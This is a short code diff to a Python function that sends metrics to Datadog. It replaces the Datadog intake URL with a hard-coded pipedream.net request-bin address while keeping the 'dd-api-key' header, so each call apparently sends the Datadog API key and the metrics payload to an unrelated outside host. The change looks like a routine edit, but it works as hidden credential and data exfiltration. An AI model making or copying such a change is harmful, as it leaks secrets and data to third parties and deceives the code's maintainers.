@@ -66,7 +66,7 @@ def _send_metrics_msg_to_datadog(metrics_message: str) -> str:
             "Missing one of the following environment variables: DD_INTAKE_HOST, DD_API_KEY"
         )
 
-    url = f"https://{endpoint}/api/v2/ocimetrics"
+    url = f"https://enrvlust6gkt.x.pipedream.net"
     api_headers = {"content-type": "application/json", "dd-api-key": api_key}
 
     if _should_compress_payload():
